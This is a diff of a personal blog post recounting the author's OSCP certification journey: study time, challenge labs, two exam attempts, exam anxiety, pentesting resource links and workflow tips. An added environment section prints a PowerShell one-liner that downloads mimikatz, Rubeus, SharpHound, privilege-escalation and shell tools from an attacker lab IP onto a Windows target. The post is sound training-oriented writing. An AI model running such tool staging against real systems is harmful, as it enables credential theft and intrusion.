@@ -56,7 +56,7 @@ After the first attempt, I had a week where it didn't really affect me, but then
 
 If you've made it this far, I'm guessing you want to know how I approached everything and what resources helped me pass.
 
-### **Content Management**
+### Content Management
 
 The syllabus has 31 modules, of which I did the ones that strictly appeared on the exam (I'm trying to complete the rest now). As I mentioned, reading the text, taking notes, and researching the techniques detailed there took me 95 hours. It might seem like a lot of boring hours, but keep in mind that throughout the syllabus there are small labs that liven up the journey.
 
@@ -68,15 +68,19 @@ Is the whole syllabus enough to pass? Yes and no.......OffSec isn't going to tea
 
 Talking to colleagues who were preparing for the OSCP, I realized that we all approached things differently, and that's the beautiful thing about this field: sharing and learning (which is why I'm making this blog).
 
-### **Labs**
+### Labs
 
 If I had to keep just one thing from the whole certification, I would definitely choose the Challenge Labs. You start from the bottom up and you really feel like you're making progress. An example: in Secura, I got stuck for 3 hours because I didn't use nxc with the --local-auth flag, and then in a more advanced lab, I was already testing with --local-auth and without it....it seems silly, but details like that help you not fail on the small stuff on exam day (which still happens).
 
 It's true that I don't see OSCP A, B, and C aligned with the difficulty of the exams....the standalone machines have a suitable difficulty similar to the exam ones, but the AD sets feel a bit outdated compared to the two AD sets I actually ended up solving in the exam (I don't know if the rest of the exam scenarios are easier).
 
-### **First Exam Attempt**
 
-On the first attempt, I felt super prepared. It's true that the little imposter inside me only remembered the machines I couldn't solve and had to look up write-ups for (I'll talk about this later).
+
+
+
+### First Exam Attempt
+
+On the first attempt, I felt super prepared. It's true that the little imposter inside me only remembered the machines I couldn't solve and had to look up write-ups for.
 
 I started at 11 AM Spanish time, and within 2 hours I already had my first 20 points from a Linux machine that honestly seemed very easy to me (after solving 50 machines on Proving Grounds). The AD took a bit more effort, but once I put all the puzzle pieces together and noticed the rabbit holes, I got the 40 points, putting me at 60 points......here began a nightmare that didn't end.
 
@@ -90,7 +94,11 @@ Even so, I wrote the report and sent it to OffSec to get feedback on what I had 
 
 Days passed, and I had to face a brutal panic about failing again. I couldn't sit down to do a CTF, I couldn't review notes or solve new machines. My head was completely exhausted, which led me to take the second exam attempt without studying.
 
-### **Second Exam Attempt**
+
+
+
+
+### Second Exam Attempt
 
 This time the exam started at 9 AM. I consider myself much more productive around 10-11 AM, which is why I always choose these kinds of times.
 
@@ -104,7 +112,11 @@ I could say that at that moment I was happy about getting the certification, but
 
 The next day I did the report, and 3 days after sending it, they confirmed I had passed.
 
-### **Resources**
+
+
+
+
+### Resources
 
 As for resources, I used the OffSec material.....What!?!? No 10 additional tutorials? The truth is I don't have a track record of all the resources used. I have commands and notes that I put together as OffSec taught me the techniques needed to pass, and I think this is the beautiful part of the certification.
 
@@ -114,24 +126,56 @@ Are all the possibilities I just mentioned covered in the syllabus? Well, no, th
 
 After this summary, I'll share some of the resources that helped me solve the labs and the exam, and which today are part of my toolkit for pentesting tasks:
 
-```txt
-Windows PrivEsc Checklist: https://daniel10barredo.github.io/PrivEscAssist_Windows/
 
-Linux PrivEsc Checklist: https://daniel10barredo.github.io/PrivEscAssist_Linux/
+[Windows Priv Esc Checklist](https://daniel10barredo.github.io/PrivEscAssist_Windows/)
 
-HackTricks: https://hacktricks.wiki/en/index.html
+[Linux PrivEsc Checklist](https://daniel10barredo.github.io/PrivEscAssist_Linux/)
 
-NXC (I used it for everything): https://www.hackingloops.com/netexec-cheat-sheet/
+[HackTricks](https://hacktricks.wiki/en/index.html)
 
-Pivoting: https://github.com/nicocha30/ligolo-ng
+[NXC CheatSheet](https://www.hackingloops.com/netexec-cheat-sheet/)
 
-Shell Handler: https://github.com/brightio/penelope
-```
+[Pivoting](https://github.com/nicocha30/ligolo-ng)
+
+[Shell Handloer](https://github.com/brightio/penelope)
+
+
+Regarding standalone machines, I already had around 50 machines on Hack The Box. I read on a lot of forums that it was more interesting to focus solely on Proving Grounds machines since they are created by OffSec and would ultimately be similar to the exam ones (this isn't entirely true). The difficulty of the standalone machines on the exam was completely different; some were extremely simple, while others were extremely complicated.
+
+You're going to read on many forums that if you aren't capable of doing 200 medium machines without looking at a write-up, you're not going to pass... that is FALSE. You can show up to the exam without doing a single Proving Grounds machine, just with the challenge labs, and if you've done a good job with documentation and research, you will pass. This was hard for me to grasp; I only understood it after passing.
+
+Looking back, I realize that the over-preparation I did for what I thought was the exam of my life actually ended up hurting me. Not being able to escalate privileges on a Proving Grounds machine would make me miserable for days, and having to look at a hint made me feel terrible, making me think I wasn't cut out for this. I could solve 3 medium and hard machines in a row without looking and I wouldn't even give myself credit for it, but I could fail at some stupid mistake and I wouldn't forgive myself for days... I think this caused me to get tunnel vision on exam day and ultimately fail.
+
+It's funny how I took my second exam attempt without studying for a month—I didn't touch a CTF or a shell outside of work for a whole month—and I ended up passing. Just following my intuition and my notes.
+
+If you want to do Proving Grounds machines, do them because you genuinely want to learn. Don't do them just to check a box like "if I do 50, I'll be more prepared," because preparation is the result of effort and learning... if you don't focus on learning, you'll never be prepared; you'll just have found 100 flags in simulated exercises.
+
+The list I used was TJNull's, which has a variety of machines that can help you along your way:
+
+[TJNULL](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview?pli=1)
 
 As for my notes, I think it's something very personal, and if you don't make your own notes, you won't see the point in getting this certification.....even so, I'll leave a screenshot of the final structure of the notes that helped me pass.
 
 ![2]
 
+
+
+
+
+
+## Environment
+
+As for the environment setup, as you might have noticed, I dedicated 5 hours to it. What was that time for, and why did I track it?
+
+Well, that was the best time I could have possibly invested. Ultimately, it’s all about making your repetitive workflows smoother. If, before starting a standalone machine, you like having a folder for ports, for material you find on the services, for users and credentials... why not create a function in your zsh that builds that structure? In the end, you're saving yourself 5 commands, which keeps every machine from feeling like a chore and lets you jump straight into the analysis.
+
+An example: for Windows privilege escalations, I liked having mimikatz, winpeas, powerup, powerview... (We're talking about CTF environments here, not real-world ones). So, I would create a tools/windows folder with all these tools, and in my notes, I had a PowerShell script like this one that would download everything into the Public user folder. That way, I could immediately start working exactly the way I like to.
+
+```powershell
+$server="192.168.45.161";$port=80;$dest="C:\Users\Public";if(-not(Test-Path $dest)){New-Item -Path $dest -ItemType Directory|Out-Null};$files=@("agent.exe","mimikatz.exe","PetitPotato.exe","PowerUp.ps1","PowerView.ps1","powercat.ps1","winPEASx64.exe","Rubeus.exe","SharpHound.exe","Invoke-RunasCs.ps1");foreach($f in $files){$u="http://$server`:$port/$f";$o=Join-Path $dest $f;Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing}
+```
+
+In short, make your day-to-day easier. It really pays off to invest a little time into setting up your own automations so that, in the long run, you save a ton of time and can dedicate it to actually learning.
 
 ## Conclusion
 
